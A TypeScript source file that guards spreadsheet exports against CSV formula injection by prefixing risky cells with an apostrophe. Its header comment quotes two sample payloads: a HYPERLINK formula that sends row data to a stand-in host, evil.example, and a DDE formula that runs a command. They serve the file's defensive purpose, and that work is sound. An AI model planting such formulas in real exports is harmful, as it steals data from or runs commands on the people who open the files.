/**
 * CSV formula-injection protection.
 *
 * The attack is specific and easy to miss. Business names, addresses and page titles in
 * this system come from other people's websites and from uploaded spreadsheets — none of
 * it is written by Baimar. A cell whose text begins with `=`, `+`, `-`, `@`, or a control
 * character is interpreted by Excel, LibreOffice and Google Sheets as a *formula* rather
 * than as text. So a business that names itself
 *
 *     =HYPERLINK("https://evil.example/?d="&A1&A2,"Click for discount")
 *
 * gets that formula executed on the salesperson's machine the moment they open the
 * exported pipeline, silently exfiltrating the rest of the row. `=cmd|'/c calc'!A1`
 * is the same trick aimed at command execution through DDE.
 *
 * The system never blocks the value — a business is allowed to have a strange name, and
 * dropping it would lose real data. Instead the cell is prefixed with an apostrophe,
 * which every spreadsheet reads as "treat the rest as literal text" and which is
 * stripped again on display. The value survives; the execution does not.
 *
 * See OWASP: CSV Injection.
 */

/** Characters that make a spreadsheet treat the rest of the cell as an expression. */
const FORMULA_PREFIXES = ['=', '+', '-', '@'];

/** Tab and carriage return also start a formula context in some spreadsheet software. */
const CONTROL_PREFIXES = ['\t', '\r'];

/**
 * Make one cell safe to open in a spreadsheet.
 *
 * Non-strings pass through untouched: a number is never a formula, and quoting it would
 * turn a numeric column into text and break every SUM in the sheet.
 */
export function sanitizeCsvCell<T>(value: T): T | string {
  if (typeof value !== 'string') return value;
  if (value.length === 0) return value;

  const first = value[0];
  if (FORMULA_PREFIXES.includes(first) || CONTROL_PREFIXES.includes(first)) {
    // A leading apostrophe is the spreadsheet convention for "this is literal text".
    return `'${value}`;
  }
  return value;
}

/** Apply `sanitizeCsvCell` to every value of a row. */
export function sanitizeCsvRow<T extends Record<string, unknown>>(row: T): Record<string, unknown> {
  const out: Record<string, unknown> = {};
  for (const [key, value] of Object.entries(row)) out[key] = sanitizeCsvCell(value);
  return out;
}

/** Apply `sanitizeCsvCell` to every cell of every row. */
export function sanitizeCsvRows<T extends Record<string, unknown>>(rows: T[]): Array<Record<string, unknown>> {
  return rows.map(sanitizeCsvRow);
}

/**
 * True when a cell would be interpreted as a formula. Used by the tests, and by the
 * import path to flag suspicious inbound values in the batch report.
 */
export function looksLikeFormula(value: unknown): boolean {
  if (typeof value !== 'string' || value.length === 0) return false;
  return FORMULA_PREFIXES.includes(value[0]) || CONTROL_PREFIXES.includes(value[0]);
}
